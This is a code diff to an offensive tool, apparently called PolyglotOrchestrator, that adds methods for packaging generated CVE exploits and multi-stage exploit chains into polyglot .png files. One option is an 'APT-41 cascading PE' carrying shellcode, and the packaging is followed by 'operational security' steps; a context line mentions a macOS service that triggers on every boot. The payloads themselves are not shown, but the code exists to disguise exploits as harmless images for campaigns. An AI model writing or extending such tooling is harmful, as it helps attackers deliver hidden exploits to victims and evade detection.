@@ -220,6 +220,11 @@ class PolyglotOrchestrator:
             validation = self.opsec.validate_operational_security(output_file)
             self.tui.info(f"OpSec Status: {validation.get('opsec_status', 'UNKNOWN')}")
 
+            # Offer to package into polyglot
+            print()
+            if self.menu.confirm("Package exploit into polyglot container?", default=True):
+                self._package_single_exploit_into_polyglot(cve_id)
+
         except Exception as e:
             self.tui.error(f"Exploit generation failed: {e}")
 
@@ -349,6 +354,11 @@ class PolyglotOrchestrator:
 
             self.tui.success(f"Campaign complete: {len(self.artifacts)} artifacts generated")
 
+            # Offer to package into polyglot
+            print()
+            if self.menu.confirm("Package chain into polyglot container?", default=True):
+                self._package_chain_into_polyglot(best_chain['cves'], platform)
+
         except Exception as e:
             self.tui.error(f"Chain analysis failed: {e}")
 
@@ -469,6 +479,11 @@ class PolyglotOrchestrator:
                         self.artifacts.append(output_file)
                         self._apply_opsec(output_file)
                         self.tui.success(f"Generated: {output_file}")
+
+                    # Offer to package into polyglot
+                    print()
+                    if self.menu.confirm("Package chain into polyglot container?", default=True):
+                        self._package_chain_into_polyglot(chain['cves'], platform)
             else:
                 self.tui.warning("No chains available")
 
@@ -1327,6 +1342,110 @@ sudo /usr/local/bin/cpu_desync_macos
         self.tui.info("macOS service installation:")
         self.tui.list_item("Run ./install_cpu_desync_macos.sh", level=1)
         self.tui.list_item("Service will trigger immediately and on every boot", level=1)
+
+    def _package_single_exploit_into_polyglot(self, cve_id: str):
+        """Package single exploit into polyglot container"""
+        self.tui.section("📦 Polyglot Packaging")
+
+        # Select polyglot type
+        polyglot_type = self._select_polyglot_type_simple()
+        if polyglot_type is None:
+            return
+
+        # Prompt for custom container file
+        print()
+        self.tui.info(f"Select container file for {polyglot_type} polyglot:")
+        self.tui.list_item("Press Enter to use default (generated file)", level=1)
+        self.tui.list_item("Or provide path to custom container file", level=1)
+        print()
+
+        custom_file = self.menu.prompt_input(
+            "Container file path (or press Enter for default)",
+            default=""
+        )
+
+        # Validate custom file
+        custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
+
+        # Generate polyglot with single exploit
+        output_file = f"polyglot_{cve_id.replace('-', '_')}_{polyglot_type}.png"
+        self.tui.info(f"Packaging exploit into {polyglot_type} polyglot...")
+
+        try:
+            if polyglot_type == 'apt41':
+                # APT-41 cascading PE
+                shellcode = self.polyglot_gen.generator.generate_shellcode('poc_marker')
+                self.polyglot_gen.create_apt41_cascading_polyglot(shellcode, output_file, custom_file_path)
+            else:
+                # Standard polyglot with single CVE
+                self.polyglot_gen.generate(polyglot_type, output_file, [cve_id], custom_file_path)
+
+            self.artifacts.append(output_file)
+            size_mb = os.path.getsize(output_file) / (1024 * 1024)
+            self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
+
+            # Show what's inside
+            self.tui.info(f"Polyglot contains: {cve_id}")
+
+            # Apply OpSec
+            if self.menu.confirm("Apply operational security?", default=True):
+                self._apply_opsec(output_file)
+
+        except Exception as e:
+            self.tui.error(f"Polyglot packaging failed: {e}")
+
+    def _package_chain_into_polyglot(self, cve_list: List[str], platform: TargetPlatform):
+        """Package exploit chain into polyglot container"""
+        self.tui.section("📦 Polyglot Packaging")
+
+        # Select polyglot type
+        polyglot_type = self._select_polyglot_type_simple()
+        if polyglot_type is None:
+            return
+
+        # Prompt for custom container file
+        print()
+        self.tui.info(f"Select container file for {polyglot_type} polyglot:")
+        self.tui.list_item("Press Enter to use default (generated file)", level=1)
+        self.tui.list_item("Or provide path to custom container file", level=1)
+        print()
+
+        custom_file = self.menu.prompt_input(
+            "Container file path (or press Enter for default)",
+            default=""
+        )
+
+        # Validate custom file
+        custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
+
+        # Generate polyglot with chain
+        output_file = f"campaign_{platform.value}_{polyglot_type}.png"
+        self.tui.info(f"Packaging {len(cve_list)} exploits into {polyglot_type} polyglot...")
+
+        try:
+            if polyglot_type == 'apt41':
+                # APT-41 cascading PE
+                shellcode = self.polyglot_gen.generator.generate_shellcode('poc_marker')
+                self.polyglot_gen.create_apt41_cascading_polyglot(shellcode, output_file, custom_file_path)
+            else:
+                # Standard polyglot with chain CVEs
+                self.polyglot_gen.generate(polyglot_type, output_file, cve_list, custom_file_path)
+
+            self.artifacts.append(output_file)
+            size_mb = os.path.getsize(output_file) / (1024 * 1024)
+            self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
+
+            # Show what's inside
+            self.tui.info("Polyglot contains:")
+            for i, cve_id in enumerate(cve_list, 1):
+                self.tui.list_item(f"Stage {i}: {cve_id}", level=1)
+
+            # Apply OpSec
+            if self.menu.confirm("Apply operational security?", default=True):
+                self._apply_opsec(output_file)
+
+        except Exception as e:
+            self.tui.error(f"Polyglot packaging failed: {e}")
 
     def _show_operation_summary(self):
         """Show operation summary (Vault7-style)"""
